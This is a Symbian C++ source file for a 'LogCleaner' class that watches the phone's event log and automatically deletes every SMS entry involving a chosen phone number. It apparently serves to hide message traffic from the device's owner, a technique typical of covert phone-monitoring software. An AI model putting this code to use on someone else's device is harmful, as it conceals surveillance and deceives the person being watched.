#include <f32file.h>
#include "LogCleaner.h"

CLogCleaner::CLogCleaner() :
	CActive(EPriorityStandard)
	{
	CActiveScheduler::Add(this);
	iStato = EHandle_NotifyChange;
	__FLOG_OPEN("HT", "LogCleaner.txt");
	__FLOG(_L("**********"));
	}

EXPORT_C CLogCleaner::~CLogCleaner()
	{
	__FLOG(_L("Desctructor"));
	Cancel();
	delete iLogView;
	delete iLogClient;
	delete iFilter;
	__FLOG(_L("End Desctructor"));
	__FLOG_CLOSE;
	}

TInt CLogCleaner::RunError(TInt aError)
	{
	__FLOG_1(_L("RUN ERROR:%d"), aError);
	return aError;
	}

EXPORT_C CLogCleaner* CLogCleaner::NewL(RFs& aFs)
	{
	CLogCleaner* self = new (ELeave) CLogCleaner();
	CleanupStack::PushL(self);
	self->ConstructL(aFs);
	CleanupStack::Pop();
	return self;
	}

void CLogCleaner::ConstructL(RFs& aFs)
	{
	iFilter = CLogFilter::NewL();
	iFilter->SetEventType(KLogShortMessageEventTypeUid);

	iLogClient = CLogClient::NewL(aFs);
	iLogView = CLogViewEvent::NewL(*iLogClient);
	
	__FLOG(_L("Init Done"));
	}

EXPORT_C void CLogCleaner::StartCleaner(const TDesC& aNumber)
	{
	iFilter->SetNumber(aNumber);
	this->NotifyChange();
	}

void CLogCleaner::NotifyChange()
	{
	if (IsActive())
		{
		__FLOG(_L("Already Active"));
		return;
		}
	iLogClient->NotifyChange(1000000, iStatus);
	SetActive();
	iStato = EHandle_NotifyChange;
	__FLOG(_L("IssueNotify"));
	}

void CLogCleaner::RunL()
	{
	__FLOG_1(_L("Stato:%d"), iStato);
	__FLOG_1(_L("RUNL:%d"), iStatus.Int());

	switch (iStato)
		{
		case EHandle_NotifyChange:
			{
			bool hasEvents = iLogView->SetFilterL(*iFilter, iStatus);
			if (hasEvents)
				{
				iStato = EHandle_SetFilter;
				SetActive();
				}
			else
				{
				__FLOG(_L("ListEmpty"));
				NotifyChange();
				}
			break;
			}

		case EHandle_SetFilter:
			{
			__FLOG_1(_L("Moved on:%d"), iLogView->Event().Id());
			iLogClient->DeleteEvent(iLogView->Event().Id(), iStatus);
			iStato = EHandle_DeleteEvent;
			SetActive();
			break;
			}

		case EHandle_DeleteEvent:
			{
			__FLOG(_L("Deleted"));
			NotifyChange();
			break;
			}
		}
	}

void CLogCleaner::DoCancel()
	{
	__FLOG_1(_L("DoCancel() %d"), iStato);
	switch (iStato)
		{
		case EHandle_NotifyChange:
			{
			iLogClient->NotifyChangeCancel();
			break;
			}
		case EHandle_SetFilter:
			{
			iLogView->Cancel();
			break;
			}
		case EHandle_DeleteEvent:
			{
			iLogClient->Cancel();
			break;
			}
		}
	}

